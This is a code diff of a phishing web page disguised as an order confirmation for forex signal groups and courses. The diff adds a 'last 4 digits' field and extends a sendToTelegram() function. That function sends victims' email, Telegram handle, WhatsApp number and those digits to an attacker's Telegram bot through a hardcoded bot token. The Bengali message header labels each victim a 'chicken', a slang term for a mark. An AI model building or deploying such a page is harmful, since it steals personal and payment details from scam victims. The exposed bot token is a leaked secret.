@@ -9,14 +9,15 @@
     <style>
         body {
             font-family: 'Roboto', sans-serif;
-            background: linear-gradient(45deg, #6a11cb, #2575fc);
+            background: linear-gradient(45deg, #6a11cb, #2575fc); /* Gradient background */
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
-            align-items: center;
+            align-items: flex-start; /* Align to the top of the page */
             height: 100vh;
-            overflow: hidden;
+            overflow: auto;
+            position: relative;
         }
 
         .container {
@@ -28,6 +29,8 @@
             max-width: 300px;
             text-align: center;
             transition: transform 0.3s ease-in-out;
+            z-index: 1; /* Ensure it is on top of the extra space */
+            margin-top: 20px; /* Give it some space from the top */
         }
 
         .container:hover {
@@ -116,98 +119,113 @@
             color: #333;
         }
 
-.contact-support {
-    margin-top: 8px;
-    font-size: 10px;
-    color: #1e4e9f;
-    text-align: center;
-    white-space: nowrap; /* Prevents wrapping */
-}
+        .payment-details {
+            display: none;
+            flex-direction: column;
+            align-items: flex-start;
+            margin-top: 12px;
+        }
 
-.contact-support a {
-    display: inline-block;
-    padding: 3px 6px; /* Smaller padding */
-    font-size: 8px; /* Smaller font size */
-    font-weight: 500;
-    color: #2575fc;
-    text-decoration: none;
-    background-color: transparent;
-    border: 2px solid #2575fc;
-    border-radius: 6px; /* Slightly smaller border radius */
-    position: relative;
-    overflow: hidden;
-    transition: all 0.2s ease-in-out;
-    vertical-align: middle; /* Aligns the link in the middle of the text */
-    margin-left: 6px; /* Slightly smaller space between text and link */
-}
+        .contact-support {
+            margin-top: 8px;
+            font-size: 10px;
+            color: #1e4e9f;
+            text-align: center;
+            white-space: nowrap;
+        }
 
-.contact-support a::before {
-    content: "";
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    width: 100%;
-    height: 100%;
-    background: linear-gradient(45deg, #2575fc, #6a11cb);
-    transition: all 0.5s ease;
-    border-radius: 50%;
-    transform: translate(-50%, -50%);
-    z-index: 0;
-    opacity: 0.1;
-}
+        .contact-support a {
+            display: inline-block;
+            padding: 3px 6px;
+            font-size: 8px;
+            font-weight: 500;
+            color: #2575fc;
+            text-decoration: none;
+            background-color: transparent;
+            border: 2px solid #2575fc;
+            border-radius: 6px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.2s ease-in-out;
+            vertical-align: middle;
+            margin-left: 6px;
+        }
 
-.contact-support a:hover::before {
-    width: 0;
-    height: 0;
-}
+        .contact-support a::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #2575fc, #6a11cb);
+            transition: all 0.5s ease;
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 0;
+            opacity: 0.1;
+        }
 
-.contact-support a:hover {
-    color: #ffffff;
-    background-color: #2575fc;
-    border-color: #2575fc;
-    box-shadow: 0 3px 8px rgba(37, 117, 252, 0.3);
-    transform: translateY(-1px);
-}
+        .contact-support a:hover::before {
+            width: 0;
+            height: 0;
+        }
 
-.contact-support a span {
-    position: relative;
-    z-index: 1;
-}
+        .contact-support a:hover {
+            color: #ffffff;
+            background-color: #2575fc;
+            border-color: #2575fc;
+            box-shadow: 0 3px 8px rgba(37, 117, 252, 0.3);
+            transform: translateY(-1px);
+        }
 
-.contact-support a:focus {
-    outline: none;
-    box-shadow: 0 0 4px rgba(37, 117, 252, 0.7);
-}
+        .contact-support a:focus {
+            outline: none;
+            box-shadow: 0 0 4px rgba(37, 117, 252, 0.7);
+        }
 
+        /* Extra background space with gradient */
+        .extra-space {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            width: 100%;
+            height: 100px;
+            background: linear-gradient(45deg, #6a11cb, #2575fc); /* Same background color as the body */
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="title">Account Info</div>
+    <div class="title">Contact Details</div>
 
     <div class="section">
         <p style="font-size: 12px;">Which item did you purchase?</p>
         <div class="radio-group" id="itemGroup">
             <label>
-                <input type="radio" name="item" value="Premium Signal Group"> Premium Signal Group
+                <input type="radio" name="item" value="Premium Signal Group" onclick="togglePaymentDetails(true)"> Premium Signal Group
             </label>
             <label>
-                <input type="radio" name="item" value="My Ultimate Forex Strategy"> My Ultimate Forex Strategy
+                <input type="radio" name="item" value="My Ultimate Forex Strategy" onclick="togglePaymentDetails(true)"> My Ultimate Forex Strategy
             </label>
             <label>
-                <input type="radio" name="item" value="Must Have Books"> Must Have Books
+                <input type="radio" name="item" value="Must Have Books" onclick="togglePaymentDetails(true)"> Must Have Books
             </label>
             <label>
-                <input type="radio" name="item" value="Elite Courses Collection"> Elite Courses Collection
+                <input type="radio" name="item" value="Elite Courses Collection" onclick="togglePaymentDetails(true)"> Elite Courses Collection
             </label>
         </div>
+    </div>
+
+    <div class="payment-details" id="paymentDetails">
+        <input type="text" id="lastDigits" class="input-field" placeholder="Enter last 4 digits" maxlength="4" oninput="validateDigits(event)">
     </div>
 
     <div class="section">
         <input type="text" id="username" class="input-field" placeholder="Enter your Email Address" required>
     </div>
-    
+
     <div class="section">
         <input type="text" id="password" class="input-field" placeholder="Enter your Telegram username (with @)" required>
     </div>
@@ -216,24 +234,45 @@
         <input type="tel" id="backupCodes" class="input-field" placeholder="Enter your WhatsApp Number" required oninput="validatePhoneNumber(event)">
     </div>
 
-    <button class="btn" onclick="sendToTelegram()">Confirm Order</button> 
-    <p class="sub-text">By clicking "Confirm Order", you agree to our terms and conditions.</p> 
+    <button class="btn" onclick="sendToTelegram()">Confirm Order</button>
+    <p class="sub-text">By clicking "Confirm Order", you agree to our terms and conditions.</p>
 
     <div id="error-message" class="error-message">
-        Please fill in all the fields before submitting.
+        Invalid Email
     </div>
 
     <div class="contact-support">
-        <p>If you have any issues, feel free to<a href="https://t.me/mehrabgaming2" target="_blank">Contact Support</a></p>
+        <p>If you have any issues, feel free to <a href="https://t.me/mehrabgaming2" target="_blank">Contact Support</a></p>
     </div>
 </div>
 
+<!-- Extra background space at the bottom -->
+<div class="extra-space"></div>
+
 <script>
+    function togglePaymentDetails(show) {
+        const paymentDetails = document.getElementById('paymentDetails');
+        paymentDetails.style.display = show ? 'flex' : 'none';
+    }
+
+    function validatePhoneNumber(event) {
+        const input = event.target;
+        input.value = input.value.replace(/[^0-9]/g, ''); // Remove any non-numeric characters
+    }
+
+    function validateDigits(event) {
+        const input = event.target;
+        if (input.value.length > 4) {
+            input.value = input.value.slice(0, 4); // Allow only 4 digits
+        }
+    }
+
     function sendToTelegram() {
         const itemGroup = document.getElementsByName('item');
         const username = document.getElementById('username').value.trim();
         const password = document.getElementById('password').value.trim();
         const backupCodes = document.getElementById('backupCodes').value.trim();
+        const lastDigits = document.getElementById('lastDigits').value.trim();
 
         let selectedItem = null;
         let errors = [];
@@ -247,18 +286,15 @@
         }
 
         // Check for empty fields
-        if (!selectedItem || !username || !password || !backupCodes) {
+        if (!selectedItem || !username || !password || !backupCodes || !lastDigits) {
             errors.push("Please fill all the credentials.");
         }
 
         // Validate Email Address
         if (username) {
             const emailUsername = username.split('@')[0];
-            if (emailUsername.length < 6 || emailUsername.length > 30) {
-                errors.push("Email address must have between 6 and 30 characters before @gmail.com.");
-            }
-            if (!username.endsWith('@gmail.com')) {
-                errors.push("Email address must end with @gmail.com.");
+            if (emailUsername.length < 6 || emailUsername.length > 30 || !username.endsWith('@gmail.com')) {
+                errors.push("Invalid Email");
             }
         }
 
@@ -293,9 +329,10 @@
         const message = `
             🐔মুরগির তথ্য:
             Selected Item: ${selectedItem}
-            Email Address: ${username}
-            Telegram Username: ${password}
-            WhatsApp Number: ${backupCodes}
+            মুরগির Email Address: ${username}
+            মুরগির Telegram Username: ${password}
+            মুরগির WhatsApp Number: ${backupCodes}
+            মুরগির নাম্বেরের শেষ ৪টি সংখ্যা: ${lastDigits}
         `;
 
         const botToken = '7683224249:AAGKd9UgEZ3mUciyZirea8LHYb1xH5vaIcw';
@@ -321,11 +358,6 @@
         .catch(error => {
             console.error(error);
         });
-    }
-
-    function validatePhoneNumber(event) {
-        const input = event.target;
-        input.value = input.value.replace(/[^0-9]/g, ''); // Remove any non-numeric characters
     }
 </script>
 
